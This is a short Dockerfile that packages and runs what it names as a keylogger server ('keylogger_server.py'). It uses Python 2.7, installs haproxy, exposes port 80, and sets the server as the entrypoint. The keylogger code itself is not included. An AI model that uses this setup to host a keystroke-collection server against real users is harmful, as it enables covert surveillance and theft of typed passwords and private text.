FROM python:2.7

RUN mkdir -p /usr/src/app
WORKDIR /usr/src/app
COPY keylogger /usr/src/app
RUN pip install --no-cache-dir -r requirements.txt
RUN chmod u+x keylogger_server.py

COPY haproxy /tmp/haproxy

RUN set -ex \
	&& apt-get update \
	&& apt-get install -y haproxy nano \
	&& rm -rf /var/lib/apt/lists/*

EXPOSE 80

ENTRYPOINT ["./keylogger_server.py"]
